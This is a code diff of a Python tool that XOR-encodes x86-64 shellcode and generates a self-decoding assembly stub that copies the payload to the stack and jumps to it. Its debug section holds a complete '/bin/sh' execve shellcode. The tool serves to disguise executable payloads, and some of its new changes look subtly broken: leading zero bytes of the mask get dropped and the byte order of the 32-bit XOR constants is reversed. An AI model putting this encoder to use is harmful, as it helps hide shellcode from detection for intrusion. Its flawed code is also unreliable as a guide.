@@ -1,4 +1,5 @@
 import subprocess
+from Cryptodome.Util.number import long_to_bytes, bytes_to_long
 
 # XOR encoding
 
@@ -20,6 +21,11 @@ def get_shellcode(file_path):
     with open('shellcode.bin', 'rb') as f:
         return f.read()
 
+def pad_shellcode(shellcode):
+    if len(shellcode) % 4 != 0:
+        print(INFO + "Padding the shellcode with `nop` instructions")
+        shellcode += b'\x90' * (4 - len(shellcode) % 4)
+    return shellcode
 
 # Recuperer l'encodage souhaité du shellcode
 
@@ -35,13 +41,11 @@ def add_padding(shellcode, expected_length, padding_data=b'\x90'):
     
 # Génerer le masque XOR
 def create_XOR_mask(shellcode, encoded):
-    if(len(shellcode) != len(encoded)):
-        print(ERROR + "The lenght of the shellcode and the encoded code doesn't match in the `create_XOR_mask` function")
+    if len(shellcode) != len(encoded):
+        print(ERROR + "The length of the shellcode and the encoded code doesn't match in the `create_XOR_mask` function")
         exit(1)
     
-    xor_mask = bytearray()
-    for sc_byte, enc_byte in zip(shellcode, encoded):
-        xor_mask.append(sc_byte ^ enc_byte)
+    xor_mask = long_to_bytes(bytes_to_long(shellcode) ^ bytes_to_long(encoded))
     return xor_mask
 
 # Verfifier que l'encodage ^ masque = shellcode
@@ -66,25 +70,49 @@ def ensure_no_null_bytes(code, what):
 # ecrire le code assembler
 def write_assembly(mask, encoding, file_path):
     with open(file_path, 'w') as f:
-        f.write("\t.global _start\n\t.text\n_start:\n\tsub $0x100, %rsp\n\tjmp trois\nun:\n\tpop %rsi\ndeux:\n")
+        f.write(f"""\t.global _start
+\t.text
+_start:
+\tpush %rbp
+\tmov %rsp, %rbp
+\tsub $0x200, %rsp
+\tjmp trois
+
+un:
+\tpop %rsi
+\tmov %rsp, %rdi
+\tmov ${len(encoding)}, %ecx
+\tcld
+\trep movsb
+\tmov %rsp, %rsi
+\tjmp deux
+
+deux:\n""")
+        
+        # Existing XOR instructions generation
         i = 0
         while i < len(mask) - 3:
-            # f.write(f"\txorl $0x{mask[i]:02x}{mask[i+1]:02x}{mask[i + 2]:02x}{mask[i + 3]:02x}, (%rsi)\n{'\tadd $4, %rsi\n' if i < len(mask) - 4 else ''}")
-            f.write(f"\txorl $0x{mask[i + 3]:02x}{mask[i + 2]:02x}{mask[i + 1]:02x}{mask[i + 0]:02x}, (%rsi)\n{'\tadd $4, %rsi\n' if i < len(mask) - 4 else ''}")
+            f.write(f"\txorl $0x{mask[i+0]:02x}{mask[i+1]:02x}{mask[i+2]:02x}{mask[i+3]:02x}, (%rsi)\n")
+            f.write("\tadd $4, %rsi\n")
             i += 4
         while i < len(mask):
-            f.write(f"\txorb $0x{mask[i]:02x}, (%rsi){'\n\tinc %rsi' if i < len(mask) - 1 else ''}\n")
-            i += 1        
-        f.write("\tjmp quatre\ntrois:\n\tcall un\nquatre:\n\t.byte ")
+            f.write(f"\txorb $0x{mask[i]:02x}, (%rsi)\n")
+            if i < len(mask)-1:
+                f.write("\tinc %rsi\n")
+            i += 1
         
+        f.write("""\tjmp *%rsp
+
+trois:
+\tcall un
+quatre:
+\t.byte """)
+        
+        # Existing byte array generation
         for i in range(len(encoding)):
-            if i == len(encoding) - 1:
-                f.write(f"0x{encoding[i]:02x}")
-            else:
-                f.write(f"0x{encoding[i]:02x}, ")
-                
-        f.write("\n")
-    print(SUCCESS + f"Assembly code written in {file_path}")
+            f.write(f"0x{encoding[i]:02x}" + (", " if i < len(encoding)-1 else ""))
+        f.write("\n\n")
+
 
 def compiler_assembler(file_path, executable):
     result = subprocess.run(['as', file_path, '-o', file_path + '.o'], stdout=subprocess.PIPE)
@@ -101,6 +129,8 @@ def main():
 
     shellcode_data = get_shellcode(dir + shellcode)
     encoding = get_encoded_file(dir + encoded)
+
+    shellcode_data = pad_shellcode(shellcode_data)
 
     if len(encoding) < len(shellcode_data):
         print(ERROR + f"The encoding data isn't long enough ({len(encoding)}) compared to the shell code data ({len(shellcode_data)})")
@@ -120,13 +150,17 @@ def main():
     write_assembly(mask, encoding, dir + asmres)
     compiler_assembler(dir + asmres, dir + executable)
 
+    print("===============")
+    top = 8
+    print(''.join(f'\\x{byte:02x}' for byte in encoding[:top]))
+    print(''.join(f'\\x{byte:02x}' for byte in mask[:top]))
+    print(''.join(f'\\x{byte:02x}' for byte in shellcode_data[:top]))
+
 def debug():
 
-    encoding = get_encoded_file(dir + encoded)
-    shellcode_data = b'\x6a\x3b\x58\x48\x31\xf6\x48\x89\xf2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x0f\x05'
-    shellcode_data = add_padding(shellcode_data, len(encoding))
-    print(len(encoding))
-    print(len(shellcode_data))
+    encoding       = b'\x41\x41\x41\x41\x41\x41\x41\x41'
+    shellcode_data = b'\x6a\x3b\x58\x48\x31\xf6\x48\x89'
+    
 
     mask = create_XOR_mask(shellcode_data, encoding)
 
@@ -137,10 +171,10 @@ def debug():
 
     print(''.join(f'\\x{byte:02x}' for byte in shellcode_data))
 
-    write_assembly(mask, encoding, dir + asmres)
+    # write_assembly(mask, encoding, dir + asmres)
 
-    compiler_assembler(dir+asmres, 'prec')
+    # compiler_assembler(dir+asmres, 'prec')
 
 if __name__ == '__main__':
     main()
-    # debug()
+    #debug()
